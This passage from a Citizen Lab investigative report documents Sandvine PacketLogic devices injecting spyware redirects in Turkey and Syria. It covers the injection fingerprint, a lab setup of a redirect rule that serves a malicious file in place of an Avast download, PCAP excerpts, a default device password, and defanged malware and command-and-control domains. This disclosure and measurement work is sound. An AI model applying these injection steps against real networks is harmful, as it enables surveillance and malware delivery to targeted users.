PacketLogic system for surveillance and censorship purposes; the deal reportedly caused consternation within the company.1.4. Blocking Human Rights and Political ContentIn Egypt and Turkey, we also found that devices matching our Sandvine PacketLogic fingerprint were being used to block political, journalistic, and human rights content.In Egypt, these devices were being used to block dozens of human rights, political, and news websites including Human Rights Watch, Reporters Without Borders, Al Jazeera, Mada Masr, and HuffPost Arabic. In Turkey, these devices were being used to block websites including Wikipedia, the website of the Dutch Broadcast Foundation (NOS), and the website of the Kurdistan Workers\u2019 Party (PKK).1.5. Procera/Sandvine employees on the ground?A search of LinkedIn reveals profiles for a Procera Networks \u201cSolutions Engineer\u201d in Istanbul, Turkey and a Sandvine (formerly Procera Networks) \u201cResident Engineer \u2013 Senior Level\u201d in Egypt. Sandvine\u2019s \u201cCareers\u201d page describes the responsibilities of a position entitled \u201cResident Operations Engineer,\u201d including \u201cperforming operations based activities, residing at the customer\u2019s location,\u201d and \u201cworking closely with the customers\u2019 operations and development teams.\u201d A 2016 Procera \u201cuse cases\u201d brochure 2 has a section on \u201cRegulatory Compliance \u2013 Traffic Blocking,\u201d which mentions that the company provides \u201cresident engineering services\u201d to support government mandates on Procera\u2019s customers that require blocking of services like VPNs or VoIP. In light of this information, on February 12, 2018, we sent a letter to Sandvine and asked whether Sandvine maintains a resident solutions engineer or other support staff in Turkey or Egypt. Sandvine did not respond to this question. The prospect of in-country work of this sort, especially at the large ISP level, raises questions regarding company awareness of, or participation in, activities with significant human rights impact.Our February 12, 2018 letters to Sandvine and Francisco Partners summarized the findings of our report and contained detailed questions about our findings and their corporate social responsibility practices. A February 16, 2018 letter from Sandvine characterized the statements in our letter as \u201cfalse, misleading, and wrong,\u201d and demanded that we return the second-hand PacketLogic device that we used to confirm attribution of our fingerprint. On February 20, 2018, Francisco Partners sent its own response, stating that the firm \u201crecognizes the importance of corporate governance and social responsibility.\u201d On March 1, 2018, Citizen Lab replied to Sandvine. Our interactions with Sandvine and Francisco Partners are discussed in further detail in Section 7.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/3/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?2. Background: Nation-State Network InjectionNation-state-level network injection to deliver spyware has long been the stuff of legends. There have been many leaked documents and vendor claims outlining purported nation- state network injection capabilities but there are no concrete public measurements that conclusively establish nation-state spyware injection in the wild.In network injection, a middlebox operates over connections between a target and an Internet site they are visiting. If the connection is unauthenticated (e.g., HTTP and not HTTPS), then the middlebox can be used to tamper with data to inject a spoofed response from the Internet site. The spoofed response may contain redirects to exploits or spyware to infect and monitor the target. A significant portion of web traffic (approximately 20- 30% in the United States) still does not use HTTPS, according to Google.Broadly, network injection systems are divided into two categories: an on-path system (also called a man-on-the-side) can simply add Internet traffic to the network, whereas an in-path system (also called a man-in-the-middle) can add traffic and also suppress legitimate traffic. A malicious response injected by an on-path system is easier for researchers to detect, because the target receives both the legitimate and malicious response. The presence of two non-similar responses to the same request is a good indicator of on-path network injection. The target\u2019s device will process whichever response is received first, so the goal of an on-path system is to inject a malicious response that reaches the user before the legitimate response. However, such a system cannot always guarantee that the target\u2019s device will see the malicious response first, due to unpredictable network delays and reordering.2.1. On-Path SystemsNSA QUANTUMBased on information from documents leaked from the US National Security Agency (NSA), NSA\u2019s QUANTUM is an on-path network injection system, and has been used to target engineers associated with Belgian telco Belgacom, employees of OPEC, and Tor users accessing terrorist content. NSA\u2019s QUANTUM has never been publicly measured in the wild, but leaked documents indicate that it functions by injecting HTTP redirects into targeted users\u2019 connections.Hacking Team Network Injection Appliance (NIA)According to a patent filed in 2010 by nation-state spyware vendor Hacking Team, and leaked documents, the company may have developed a similar on-path network injection system called the Hacking Team Network Injection Appliance (NIA). This system has never been publicly measured in the wild. The patent indicates that the NIA functions by injecting HTTP redirects into targeted users\u2019 connections.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/4/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?2.2. In-Path SystemsFinFly ISPLeaked documents from nation-state spyware vendor FinFisher indicate that the company sells an in-path network injection system called FinFly ISP. The complex system supports a number of unique features, such as rewriting downloaded binaries on- the-fly. The system was apparently sold to governments in Mongolia and Turkmenistan, and at least one additional customer that could not be identified from the 2014 FinFisher leaked documents. This system has never been publicly measured in the wild.China\u2019s Great CannonChina\u2019s Great Cannon is an in-path network injection system, which was used in 2015 (and perhaps as recently as 2017) to inject JavaScript that enlists targets\u2019 browsers in distributed denial of service (DDoS) attacks against the Chinese diaspora\u2019s efforts to spread censored information. In a 2015 report, we hypothesized that the Great Cannon could also be used to distribute spyware, but this has never been publicly measured in the wild.Sandvine PacketLogicAccording to our measurements (Section 3.3), Sandvine\u2019s PacketLogic product supports in-path network injection. The company advertises that they support \u201cregulatory compliance\u201d but does not mention spyware injection. Nevertheless, the product has support for defining rules that inject data into targeted connections (Figure 4). As we document in this report, the PacketLogic product may have been used by government- linked entities in both Turkey and Egypt to inject spyware.2.3. The Procera/Sandvine value proposition3A Procera \u201cuse cases\u201d brochure has a section on \u201cRegulatory Compliance \u2013 Traffic Blocking.\u201d The section links to a 2002 article by Electronic Frontiers Australia entitled \u201cInternet Censorship: Law & policy around the world\u201d and mentions that \u201cProcera\u2019s solutions provide the capabilities to identify and block, or shape down to become unusable, any identifiable service network wide or on an individual subscriber basis.\u201dProcera appears to have pitched its services as a win-win for both ISPs and governments that require Internet censorship solutions, or as a way for ISPs to save money while implementing regulatory requirements that do not generate any revenue:\u201cOperators that are required to filter content from their networks by governmental regulations are struggling to find solutions that can keep up with the explosive bandwidth growth of the past few years. Many telecom operators are required to invest several racksurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/5/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?worth of equipment for a single use case with no return on investment through additional ARPU from subscribers.\u201dThe document describes the close ongoing relationship Procera may have maintained with its clients to help them implement \u201cregulatory requirements,\u201d in some cases apparently having a Procera employee assist government clients with censorship:\u201cAs an example, adult content can be opted in on an individual bases [sic] or services like Skype could be enabled for corporate clients only. Procera updates it\u2019s [sic] signature database on a weekly basis to stay up to date on changes in what traffic looks like. Blocking proprietary over-the-top services will always remain a cat and mouse game that requires local dedicated personnel to perform well. Procera can provide these resident engineering services.\u201dSandvine appears to offer instructor-led training sessions, such as the \u201cOperating with PacketLogic\u201d course. If desired, Sandvine can offer such courses as a \u201ccustomer-exclusive session delivered at the customer\u2019s location\u201c.3. Catching Nation-State spyware injection in the wildThis section describes how we obtained the first-ever packet captures (PCAPs) of nation- state spyware injection, and how we matched the characteristics of the spyware injection to Sandvine PacketLogic devices.3.1. An initial reportA September 2017 report revealed that ISPs in two (unnamed) countries were likely injecting FinFisher spyware into targeted users\u2019 Internet connections when the users tried to download popular Windows applications. The injection was implemented using HTTP redirects matching the format shown in Figure 1.HTTP/1.1 307 Temporary Redirect Location: [location] Connection: closeFigure 1: Injected HTTP 307 redirect to spyware seen in two countries.A follow-up report in December 2017 found no further evidence of spyware injection from one of the two countries from the original report and found that operators of the injection in the second country switched from FinFisher spyware to a piece of spyware that was similar to the StrongPity spyware. StrongPity was an unattributed APT operation in 2016 that primarily targeted individuals in Italy and Turkey.3.2. Scanning and identifying countriesurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/6/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Discovering that an ISP or government is tampering with a user\u2019s Internet connection by injecting malicious responses to the user\u2019s requests is difficult. Typically, this requires the user to send requests, record the responses they receive, and share this data with researchers. However, we find that some network injection is bidirectional: we can sometimes receive a malicious injected response when we send a request to a targeted user.We checked Shodan, a website on which anyone can search the results of global Internet scans, for the header format in Figure 1, and found thousands of IP addresses in dozens of countries returning similar (non-malicious) redirects, sometimes to landing pages about billing like \u201cYour Internet service has been suspended for non-payment.\u201d It seemed peculiar to us that Shodan saw these messages when it scanned the IP address of a customer who was suspended for non-payment, because the messages would only need to be visible to the customer themself. The fact that Shodan received responses from thousands of IP addresses matching the same header format used to inject FinFisher spyware in two countries (Figure 1) suggested to us that the spyware injection might also be bidirectional.4We scanned the Internet in October 2017, sending every IPv4 address an HTTP request to download the Opera Web Browser, one of the applications that a September 2017 report indicates was targeted for spyware injection. Our initial scan found dozens of IP addresses on T\u00fcrk Telekom that returned 307 redirects such as the ones in Figure 2.HTTP/1.1 307 Temporary Redirect Location: url Connection: closeHTTP/1.1 307 Temporary Redirect Location: url Connection: closeFigure 2: Injected HTTP 307 spyware redirects we observed in Turkey when performing HTTP requests for Opera.We successfully fetched the files from a Turkish IP address using a VPN. When we tried to fetch the files from a non-Turkish IP, we received a 503 Service Temporarily Unavailable message. The files were similar to the StrongPity spyware. 5We continued to perform scanning of Turkey and set out to fingerprint the middlebox performing the spyware injection. As part of our scanning, we obtained packet captures (PCAPs) that show network-level details of the spyware injection. These are the first ever public PCAPs showing nation-state spyware injection.3.3. Attribution of middlebox to Sandvineurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/7/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Fingerprint elementsBased on our PCAPs, we identified several elements of the injection in Turkey which, in conjunction, form what we believe to be a highly distinctive fingerprint:1. In all injected packets, the IPID is always 13330 (0x3412, which is 0x1234endian-swapped) for all injected packets. This value is unusual, as the IPID is typically incremented or pseudorandomly generated, and is not a fixed value. 2. In all packets, the IP flags are all zero. This characteristic is unusual asmodern TCP stacks typically default-enable Path MTU Discovery for TCP sockets, which results in the \u201cdon\u2019t fragment\u201d IP flag being set to 1.3. The injected packet received by the client is either an empty RST/ACKpacket, or a FIN/ACK packet, with an HTTP 307 redirect whose headers exactly match the form of redirect in Figure 1.4. If a FIN/ACK is injected, then the injector sends an unsolicited final ACK packet to the client ~100ms later. This behavior is unusual, as a well- behaving TCP stack would wait to see the FIN/ACK from the client before sending the final ACK.Given the well-documented controversy over the installation of Sandvine PacketLogic devices in Turkey, we purchased a PacketLogic device second-hand to confirm whether its behavior matched our fingerprint.Our second-hand PacketLogic deviceWe purchased a Sandvine PacketLogic device second-hand. The device was a PacketLogic PL7720, which is a 2U rackmount version of PacketLogic with Procera livery. This model is well past its designated end-of-life date and no longer serviced by the company. The device was installed with firmware version 12.1, which was released in 2009. The device also contained a PacketLogic license file that appeared to be valid in perpetuity for the currently installed version of the firmware but which cannot be used to upgrade to a later version. Version 12.1 appears to be the earliest version of PacketLogic firmware to contain support for network injection.6Figure 3: A picture of our second-hand Sandvine PacketLogic box, with Procera livery.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/8/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?The device has two USB ports, an RS232 (on RJ45) serial console port that can be used to access a text-based menu configuration system, two management ethernet ports, and a single channel over which the middlebox operates. The channel has an internal ethernet port (Int) and an external ethernet port (Ext). The middlebox would typically operate over traffic flowing between a local network (connected to the Int port), and the rest of the Internet (connected to the Ext port). An operator could add rules to the middlebox to take certain actions over this traffic (e.g., block traffic to a website, inject traffic for targeted users, etc.).We powered up the device and connected through its Admin management port. We used an old version of the PacketLogic Client available on the Internet Archive to interface with the device, as no current version of the PacketLogic Client on Sandvine\u2019s website appeared to support version 12.1 of the firmware. We used the default password \u201cpldemo00\u201d printed on the device to log in. We connected one experiment computer to the PacketLogic device\u2019s Ext port, and a second experiment computer to the Int port in order to observe characteristics of the device\u2019s operation. At no time did we connect the device to the Internet.Redirecting users to a malicious fileWe added a rule to redirect users who requested an Avast Antivirus setup file to a malicious file. This test involved creating a PropertyObject to match requests whose URL ended in the filename for Avast Antivirus: avast_free_antivirus_setup_online.exe, and then a Filtering Rule to redirect all connections matching the PropertyObject to a malicious file. This redirection used the built-in Inject action. The PacketLogic GUI has an \u201cInsert 307 Temporary Redirect\u201d button that, when pressed, pastes an HTTP 307 Temporary Redirect response identical to element 3 of our fingerprint (at the start of this section). The PacketLogic operator can configure the \u201cLocation\u201d header, which is initially blank; in this case, we entered: url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/9/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Figure 4: How we set up our Sandvine PacketLogic device to inject spyware when a usertries to download Avast Antivirus. We believe a similar setup exists in Turkey.Without any further configuration, this rule caused our PacketLogic device to inject the redirect in response to a matching request in either direction (internal to external, or external to internal). This mirrors our experience of being able to reproduce spyware injection in Turkey from requests sent external to internal. We noticed that we could add an extra condition to the rule in order to restrict the injection to a single direction.Our experiment matched elements 1-3 of our fingerprint, but did not completely match element 4. Specifically, our PacketLogic middlebox injected an unsolicited final ACK back-to-back after the FIN/ACK containing the 307 Temporary Redirect instead of injecting it following the ~100ms delay we observed in Turkey and Egypt. Our version of the PacketLogic firmware (12.1) was the first to support injection; we hypothesize that the ~100ms delay between the data packet and the final ACK was added in a later firmware version, potentially to reduce the probability of the ACK being reordered before the FIN/ACK; such a reordering would cause the injection recipient\u2019s TCP connection to hang in the LAST_ACK state, which is the scenario that sending the ACK seeks to avoid.Figure 5 shows an excerpt from our client-side PCAP that captures the injection from our test PacketLogic device. Note that the IPID is 13330 in both injected packets, both injected packets have no IP flags, the format of the HTTP 307 redirect is what we expect, and the final ACK packet is unsolicited.Client sends GET request for Avast file17:28:25.024018 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 170) [nop,nop,TS val 756363711 ecr 2094486068], length 118: HTTP, length: 118 User-Agent: curl/7.54.0 Accept: */*Client receives injected data (redirect to spyware file)17:28:25.024300 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), length 134) 94: HTTP, length: 94 HTTP/1.1 307 Temporary Redirect Location: url Connection: closeClient receives injected ACK17:28:25.024302 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), length 40) our test PacketLogic device. Note that the server side does not receive the HTTP request for the Avast file. Instead, it receives an injected RST packet with IPID 13330 and no flags. Note that the timestamp discrepancy in the PCAP files is because the server and client clocks were not synchronized.Server receives injected RST17:28:06.715257 IP (tos 0x0, ttl 64, id 13330, offset 0, flags [none], proto TCP (6), length 40) distinctive implementation choices as PacketLogic\u2019s was used in the injection in Turkey and Egypt. It is possible that another vendor copied PacketLogic\u2019s design, such as by studying and exactly re-implementing PacketLogic\u2019s custom TCP stack and HTTP header format in injected redirects. It is also possible that, with or without Sandvine\u2019s knowledge, a third party obtained and copied PacketLogic\u2019s code. It might also be possible that both Sandvine and other companies drew their code from the same third-party codebase.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/11/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?7There are, however, several reasons why the shared code hypothesis is unlikely to be an accurate explanation of our findings. First, the 2016 controversy within Procera about selling their solution to Turkey for surveillance (referred to in Section 1.3) indicates a possible prior business relationship between the company and Turkey. Second, we have not been able to locate any codebase with both the same distinctive IPID value and the same distinctive HTTP header format; the only references to IPID values of 13330 (0x3412) we found were a 2016 OONI report about the ad injection we mention in Section 5, and a 2004 forum post by an individual in Sweden curious as to why he was seeing IPID values of 13330 when he tried to ping the IP addresses of his website\u2019s visitors with unsolicited TCP segments. It is significant in this regard that it was a Swedish company, Netintact AB, founded in 2000, that developed and sold the PacketLogic product before Procera acquired the company in 2006. Third, performing single packet injection in a TCP connection is a relatively simple feat to achieve; an engineer wishing to implement this functionality would likely not need to study or copy another implementation.4. Turkey case: targeted malware injectionThis section describes how DPI equipment that matches our Sandvine PacketLogic fingerprint is used to inject malware to users in Turkey and Syria who attempt to download common Windows software.4.1. Turkey background: information controls and surveillanceIn spite of being a parliamentary democracy with decades of multi-party elections, Turkey\u2019s government is characterized by corruption, human rights abuses, and autocratic tendencies on the part of the current Prime Minister Recep Tayyip Erdo\u011fan. Turkey\u2019s military has traditionally been an important and occasional overbearing presence in domestic politics, with the country experiencing several coup attempts. Information controls played an important part in the most recent such attempt, which was foiled by President Erdo\u011fan in July 2016. Prior to the coup attempt, Turkish authorities routinely throttled access to prominent social media sites, such as Twitter and Facebook. Erdo\u011fan used Apple\u2019s Facetime video calling application during the coup attempt to plead with the Turkish public to resist the plotters. While restrictions on social media were softened to facilitate popular opposition to the coup, the openness was short lived, with Internet censorship returning (and even increasing) after Erdo\u011fan successfully re-asserted his authority.Although there is widespread and growing popularity of social media in Turkey, which provides citizens with an alternative to conservative state-controlled mainstream media, the country has one of the most extensive Internet censorship regimes in the world. ISPs routinely throttle access to popular social media, make frequent requests to service providers to remove content, and even implement occasional regional shutdowns. According to Twitter\u2019s transparency report, Turkey led the world with 2,710 removalurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/12/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?requests in the first six months of 2017. Although Turkey\u2019s numerous security threats, and in particular those related to Islamist and other terrorist attacks, are provided as justifications for such expansive controls, Internet censorship has included a broad range of other content such as criticism of the Erdo\u011fan regime.The first Internet-related legislation in Turkey was passed in 2007. It is called \u201cLaw No. 5651, Regulation of Publications on the Internet and Suppression of Crimes Committed by means of Such Publications,\u201d or \u201cInternet Law\u201d for short. The Internet Law introduced Internet censorship across a range of content categories and mandated service providers to monitor online content passing through their infrastructure. Additional laws and broader information controls were applied in the aftermath of the 2013 Gezi protests, including Law No. 6532, passed in April 2014, which criminalized \u201cthe leaking and publication of secret official information, punishable by a prison term of up to nine years.\u201d The law authorizes the Turkish intelligence agency, Milli \u0130stihbarat Te\u015fkilat\u0131 (MIT), to \u201ccollect data relating to external intelligence, national defense, terrorism, international crimes and cyber security passing via telecommunication channels.\u201d These laws and practices have imposed strict responsibilities on ISPs to block and disrupt access to targeted URLs (in some cases through DNS poisoning), and to monitor and archive Internet traffic for two years. The responsibilities have, in turn, prompted the acquisition of mass and targeted surveillance technologies. A 2014 Citizen Lab report traced activity related to Hacking Team spyware to an IP address owned by T\u00fcrk Telekom, and a 2015 report mapped FinFisher spyware to Turkey.MIT\u2019s practical implementation of the 2014 national security laws requires the cooperation of the Turkish telecommunications sector, which is centralized around T\u00fcrk Telekom. While technically a private company, T\u00fcrk Telekom is heavily controlled by the ruling AKP party. The AKP exerts influence over T\u00fcrk Telekom through its supposed independent regulator, the Information and Communications Authority (which is itself controlled by the state), as well as a large ownership stake controlled by the Turkish Treasury department. The government\u2019s direct influence over T\u00fcrk Telekom was demonstrated following the July 2016 coup attempt, when several T\u00fcrk Telekom senior executives were purged from the company.4.2. Localizing the targets of Turkey\u2019s malware injectionIn a February 2018 scan of Turkey, we identified five different malicious domain names that were injected in response to HTTP requests for Opera. We performed traceroutes for the targeted IP addresses and found targeting in at least five provinces, based on names we found in the furthest downstream reverse DNS (PTR) record. Figure 7 shows the five provinces where we identified injection.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/13/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Figure 7: Locations of the targets of spyware injection in Turkey and Syria.Over five months of scanning we found a total of 259 targeted IP addresses. However, this is not a complete count of targeted IP addresses; we could only measure IP addresses that responded to our scans (i.e., had an open TCP port).We were able to develop a general sense of target identities by scraping data from public router pages hosted on some of the IP addresses. The pages show names chosen by the people who set up the routers, including names of users sharing the connection. In some cases, the names chosen were of Syrian cities. We conducted on-the-ground testing in one such Syrian city and found that all users of a particular Internet reseller (sharing the same T\u00fcrk Telekom IP) were targeted. We also found several router pages showing names containing \u201cypg\u201d (e.g., ciwan.ypg and ypg-matar), indicating possible targeting of YPG (Kurdish militia) members or facilities. We also found that some routers were named for resellers in Turkey and Syria. We found Facebook pages for some of the named resellers which showed images of the resellers building infrastructure to provide Internet access using T\u00fcrk Telekom leased lines (Figures 8 and 9).url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/14/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Figure 8: One Turkey-based reseller whose customers appear to be targeted builds atower to beam Internet to border areas in Syria\u2019s Afrin region.Figure 9: Images posted by one Syrian-based reseller in the Idlib area whose users appear to be targeted. The reseller appears to redistribute T\u00fcrk Telekom service viaVDSL in one Syrian village.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/15/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?After we sent letters to Sandvine and Francisco Partners on February 12, 2018, we ran tests on February 14 and February 16, 2018 which found that two targeted IP addresses\u2013 on which we had observed injection since October 2017\u2013 no longer produced injection. We conducted a full scan of Turkey on March 7, 2018 and found that these two IP addresses again produced injection, but with different domain names. Our March scan also found that the operators of the injection had changed some of the injected domain names.Malware domain (Feb- ruary 2018)solitude.file- download[.]todayMalware domain (March 2018)system.filedownloaders[.]comInjection locationHataysystem.documentations[.]liveepoch.englishdownloaders[.]todayGaziantepepiphany.download- document[.]worldepiphany.download-document[.]world Ankara (Ulusquarter)epoch.wind-files[.]todaydocument.downloadingsystem[.]comAdanainternet.document- management[.]todayinternet.downloadingdocuments[.]com Diyarbakir4.3. Identifying targeted applicationsWe performed testing of targeted IP addresses to see what additional applications were being targeted. We sent requests like the one in Figure 10 for a variety of paths and filenames matching popular Windows software. We tested filenames associated with the IOCs from two earlier reports, as well as the top 20 Windows applications on Download.com (one of the IOCs from previous reports pointed to a file called avast_free_antivirus_setup_online_cnet1.exe).GET [path] HTTP/1.1 Connection: closeFigure 10: Form of requests that we sent to test for targeted applications.We found at least ten applications whose downloads were targeted for spyware injection. Figure 11 lists the targeted applications we found, and for each application, a non- exhaustive list of websites where targeted users\u2019 downloads of these applications would be injected with spyware.url\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/16/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Path/opera/stable/windows/vlc-2.2.8-win32.exe/ccsetup539.exe/wrar550.exe/wrar540tr.exe/winrar-x64-550.exe/winrar-x64-550tr.exe/7z1701.exe/7z1701-x64.exeWhich ap- Turkish7-Zip7-Zip (64- bit)If a user visits this site to download the application, the path will be fetched unauthenticated over HTTPopera.comdownload.videolan.org 8ccleaner.com download.comdownload.com?download.com?7-zip.org7-zip.org/avast_free_antivirus_setup_online.exe download.com/driver_booster_setup.exe/SkypeSetup.exe/advanced-systemcare-setup.exeDriver BoosterSkypeiobit.comdownload.comAdvanced SystemCareiobit.comFigure 11: Applications targeted for spyware injection in Turkey.Some of these websites supported HTTPS, but did not redirect users to the HTTPS version when directly visited. As an example, when a user visited opera.com (the unencrypted version), they were not redirected to the HTTPS-encrypted version automatically. According to Internet Archive data, Opera seems to have fixed the issue onurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/17/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?March 7, 2018, between 07:26GMT and 16:04GMT. Surprisingly, some websites we tested, like avast.com, iobit.com, and ccleaner.com, used HTTPS on their main website but directed users to download links that did not use HTTPS. While the user saw an HTTPS page in their browser, the file that the page downloaded to their computer was via HTTP (Figure 12). Targeted users in Turkey and Syria would have received spyware instead of the legitimate version of the app. Sometime after February 13, 2018, Avast fixed one page on their avast.com site to use HTTPS for downloads. However, as of the publication date of this report, another page on avast.com redirects users to an insecure download on download.com. Piriform fixed their ccleaner.com site to use HTTPS for downloads sometime after February 23, 2018. Also, as of the date of publication, some websites we list in Figure 11 do not appear to support HTTPS at all, including download.com, 7-zip.org.9Figure 12: The Avast website in February 2018, showing an HTTPS padlock while automatically starting an insecure file download. The lack of HTTPS on the filedownload means that targeted users in Turkey and Syria will instead receive spyware.Avast fixed this particular issue in late February 2018.This situation can be particularly problematic for activists who may rely on advice to use apps like CCleaner and Avast. For example, the digital security guide Security in a Box advises the use of both products and links to the official websites of these products, both of which offered insecure downloads.4.4. Connection with FinFisher campaignVirusTotal records that a sample of StrongPity-like spyware communicating with updserv-east-cdn3[.]com was downloaded from download.downloading[.]shop, the same site used to distribute samples of FinFisher. The updserv-east-cdn3[.]com server was alsourl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/18/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?the command and control (C&C) server for the samples of StrongPity-like spyware downloaded in a subsequent phase of the injection campaign that we observed, from sites including downloading[.]internetdownloading[.]co and downloading[.]syriantelecom[.]co.5. AdHose: Mass connection hijacking to deliver affiliate ads in EgyptThis section describes how DPI equipment that matches our Sandvine PacketLogic fingerprint is installed on Telecom Egypt\u2019s network at Egypt\u2019s borders, and is used to deliver affiliate ads, cryptocurrency mining scripts, and perhaps nation-state spyware, to Egyptian Internet users.5.1. Egypt background: malware, surveillance, and censorshipSeven years after the 2011 demonstrations in Cairo\u2019s Tahrir Square, Egyptian President Abdel Fattah el-Sisi has escalated a violent crackdown against opposition and dissent. Under the guise of combating terrorism, particularly following a series of ISIS church bombings, the el-Sisi government has engaged in mass arrests, forced disappearances, and torture against targeted journalists, human rights defenders, and protesters. The brief window opened during the Arab Spring period has closed as el-Sisi has sought to strengthen his rule and silence critics of his regime.The Egyptian government has been widely criticized for its human rights abuses and corruption. A May 2017 law ratified by el-Sisi was criticized as stifling dissent as it imposes new restrictions on foreign NGOs, subjects groups to additional security monitoring and financial reporting requirements, and imposes heavy fines on groups who publish without government permission. Reporters Without Borders has ranked Egypt 161st out of the 180 countries it included in its 2017 World Press Freedom Index. More than 15,000 civilians have been tried in military courts since 2014, and more than 800 people have been sentenced to death since 2013. Corruption is also endemic across all of society in Egypt, in spite of numerous attempts by various government agencies to reign it in. Transparency International ranked Egypt 108 out of 176 countries in its 2016 Corruption Perceptions Index.Egypt adopted a new constitution following a January 2014 referendum. While the revised constitution does contain provisions protecting freedom of expression, access to information, and freedom of the press, it also contains exceptions which allow censorship during periods of war or state of emergency. Prior to the 2011 Arab Spring, Egypt had generally been under a continuous state of emergency since 1958. Following a short reprieve in 2012, successive Egyptian governments have repeatedly reimposed emergency rule, and most recently in January 2018. Such declarations expand the arrest and detention powers of security forces and permit media censorship. El-Sisi has also targeted the country\u2019s judiciary by ratifying a bill which empowers him to select the courts\u2019 chiefurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/19/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?justices. Several potential political candidates have been arrested or face intimidation and physical violence in advance of the March 2018 Presidential election. The election, which is virtually guaranteed to see el-Sisi elected to a second term, has been widely criticized as undemocratic.Telecommunications surveillance is facilitated under the 2003 Telecommunications Regulation Law. This law compels telecommunications operators to provide technical capacity for the military and national security entities to \u201cexercise their powers within the law\u201d as well as prohibiting the use of \u201ctelecommunication services encryption equipment\u201d without written authorization from entities including the armed forces. Article 73 of the Telecommunications Law prohibits telecommunications providers from interfering with any part of a telecommunication message.The ongoing crackdown against critical voices has extended to online censorship. The pre-Arab Spring Mubarak government did not engage in widespread online censorship. However reports of censorship have increased in recent years. Testing conducted by the OONI project in 2016 confirmed reporting that Qatari-owned news website The New Arab and its Arabic language version were blocked.Censorship in Egypt has also reflected regional concerns. Egypt, and four other Arab states including Saudi Arabia, have accused Qatar of supporting terrorism and destabilizing the region. In response, Egypt was reported in May 2017 to have blocked access to 21 news websites for \u201csupporting terrorism and spreading false news\u201d. The blocked websites included Qatar-based Al Jazeera as well as prominent local independent news website Mada Masr. In September 2017 Egypt blocked the Human Rights Watch website one day after HRW released a report documenting the use of torture by the country\u2019s security services.The use of surveillance technology by the Egyptian government has been widely documented, particularly the technologies operated by an obscure intelligence agency called the Technical Research Department (TRD). A 2015 Citizen Lab report identified that a server used in the operation of FinFisher surveillance malware was present on networks operated by the TRD. Similarly, Privacy International obtained documents leaked from Nokia Siemens Networks which showed that the company sold an interception management system and monitoring centre to the TRD. The leaked emails from surveillance company Hacking Team indicated that the company had sold its surveillance malware system to the TRD for more than 1 million Euros.A 2017 Citizen Lab report documented a large-scale phishing campaign against Egyptian civil society members. Virtually all of the targets identified in this report were implicated in Case 173, a legal case brought by the Egyptian government against domestic NGOs. In this case, the government has accused NGOs of improperly receiving foreign funding and engaging in prohibited activities.5.2. Following up on earlier findingsurl\ufb01c-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/20/386/30/2020BAD TRAFFIC: Sandvine\u2019s PacketLogic Devices Used to Deploy Government Spyware in Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?A September 2017 report found FinFisher spyware injected via HTTP 307 